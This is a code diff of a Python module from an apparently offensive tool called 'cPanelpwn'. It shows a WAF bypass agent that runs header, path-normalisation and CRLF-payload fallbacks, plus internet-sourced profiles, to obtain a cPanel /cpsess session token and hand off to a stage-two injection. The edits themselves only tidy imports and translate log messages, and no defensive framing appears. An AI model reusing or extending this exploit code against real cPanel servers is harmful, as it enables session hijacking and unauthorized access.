@@ -1,14 +1,12 @@
 """Módulo cPanelpwn: waf."""
 
 import re, json, os, threading, time
-from typing import Optional, Dict, List, Set, Callable
+from urllib.parse import quote
+from typing import Optional, Dict, List
 from . import config as cfg
-from . import http
-from . import core
-from . import exploit
 from .exploit import stage2_inject
 from .config import C, log
-from .http import _do, R
+from .http import _do
 from .core import build_url, PAYLOAD_B64_CR, PAYLOAD_B64_LF
 
 # ══════════════════════════════════════════════════════════════
@@ -683,10 +681,10 @@ def waf_bypass_agent(waf: str,
 
     Orden de execução:
       1. Fallbacks de headers genéricos (13 técnicas, sem rede)
-      2. Perfiles extra específicos do WAF (em paralelo com a pesquisa online)
+      2. Perfis extras específicos do WAF (em paralelo com a pesquisa online)
       3. Fallbacks de normalização de caminho (6 variantes URI)
       4. Fallbacks de payload CRLF alternativos (3 variantes: bare-CR, só-LF, CR+shotgun)
-      5. Perfiles pesquisados na internet (obtidos de fontes públicas em segundo plano)
+      5. Perfis pesquisados na internet (obtidos de fontes públicas em segundo plano)
 
     Devolve o token /cpsess no primeiro bypass exitoso, ou None se
     esgotam todas as técnicas.
@@ -739,7 +737,7 @@ def waf_bypass_agent(waf: str,
             return token
 
     # Fase 2 — técnicas de normalização de caminho
-    log("INFO", f"[bypass-agent] Alterando a técnicas de normalização de caminho...")
+    log("INFO", "[bypass-agent] Alternando para técnicas de normalização de caminho...")
     for i, profile in enumerate(_PATH_FALLBACKS, 1):
         token = _try_profile(profile, f"path-{i}")
         if token:
@@ -749,7 +747,7 @@ def waf_bypass_agent(waf: str,
             return token
 
     # Fase 3 — técnicas de payload CRLF alternativo
-    log("INFO", f"[bypass-agent] Alterando a técnicas de payload alternativo...")
+    log("INFO", "[bypass-agent] Alternando para técnicas de payload alternativo...")
     for i, profile in enumerate(_PAYLOAD_FALLBACKS, 1):
         token = _try_profile(profile, f"payload-{i}")
         if token:
@@ -763,7 +761,7 @@ def waf_bypass_agent(waf: str,
 
     if researched:
         log("INFO",
-            f"[bypass-agent] Provando {len(researched)} técnica(s) investigadas em internet...")
+            f"[bypass-agent] Testando {len(researched)} técnica(s) obtidas na internet...")
         for i, hdrs in enumerate(researched, 1):
             log("INFO",
                 f"[bypass-agent] [net-{i}/{len(researched)}] "
